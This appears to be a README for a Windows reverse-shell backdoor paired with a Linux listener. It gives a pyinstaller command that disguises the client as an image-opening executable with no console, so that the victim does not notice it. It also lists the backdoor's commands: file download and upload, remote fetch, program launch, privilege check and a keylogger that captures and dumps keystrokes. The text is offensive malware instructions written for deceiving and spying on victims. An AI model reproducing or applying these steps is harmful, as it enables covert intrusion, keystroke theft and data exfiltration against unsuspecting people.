This backdoor helps us to execute commands on the target PC (Windows)

Run the server.py on Linux OS and win_reverse(reverse shell should be sent to target PC(windows))

Before running this, edit both the files and change the IP address to your Linux IP

First by pyinstaller we should convert win_reverse.py into win_reverse.exe file

Eg:pyinstaller --add-data "/root/image.jpg:," --onefile --noconsole --icon /root/image.ico win_reverse.py

	Here --add-data allows us to open an image
	     --onefile is used to make one executable file
	     --noconsole is to hide the command prompt
   	     --icon is for the thumbnail of the exe file

Here the victim won't be able to figure out that this is a Backdoor

The only thing he can see is an image

Now run the server.py on your Linux OS

As soon as victim opens the exe file we can execute any commands on Target PC 


download path	->Download a file from target PC

upload path	->Uploads a file to target PC

get url		-> download a file to target from any website

start path	->start program on target PC

check		->check for administrator priviledges

keylog_start	->Start keylogger on target PC

keylog_dump	->Print keystrokes captured by keylogger

q		->quit
